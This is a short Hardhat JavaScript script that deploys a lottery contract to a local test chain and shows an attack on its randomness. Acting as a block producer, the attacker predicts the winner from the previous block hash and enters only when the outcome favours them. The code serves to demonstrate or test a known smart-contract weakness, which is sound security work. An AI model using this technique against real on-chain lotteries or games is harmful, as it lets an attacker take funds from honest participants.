const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main(quorum) {
    // deploy lottery contract
    const accounts = await ethers.getSigners();
    const Lottery = await ethers.getContractFactory("LotteryV2");
    const lottery = await Lottery.deploy(quorum,10,1);
    console.log(`lottery deployed to ${lottery.address}`)

    // set up conditions to prime the attack
    // (quorum - 1) persons enter the lottery with 1 ETH
    for (i = 0; i < quorum - 1; i++) {
        await ethers.provider.send(`evm_mine`);
        await lottery.connect(accounts[i]).enter({
            value: ethers.utils.parseEther("1.0")});
    }

    // attack!

    // Here, we pretend to be the node selected to produce a new block
    // As the block producer, we have access to this block's `block.random` 32 byte value on the HPB chain
    // or the previous `block.hash` 32 byte value on Ethereum or other chains

    // We can use this information to infer the lottery's outcome, and only participate if we know that we will win.

    let won = false;
    while (won == false) {
        currentBlockNumber = await ethers.provider.getBlockNumber()
        prevBlockHash = (await ethers.provider.getBlock(currentBlockNumber)).hash
        byteArray = ethers.utils.arrayify(prevBlockHash)
        expectedRand = BigNumber.from(byteArray)
        winnerIndex = expectedRand.mod(10);

        if (winnerIndex == 9) {
            //enter the lottery
            await lottery.connect(accounts[quorum-1]).enter({
                value: ethers.utils.parseEther("1.0")});
            console.log("Attacker won the lottery!")
            won = true
        } else {
            await ethers.provider.send(`evm_mine`);
            console.log("This block would've produced a losing transaction. Lets skip it.")
        }
    }
}

main(10)
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });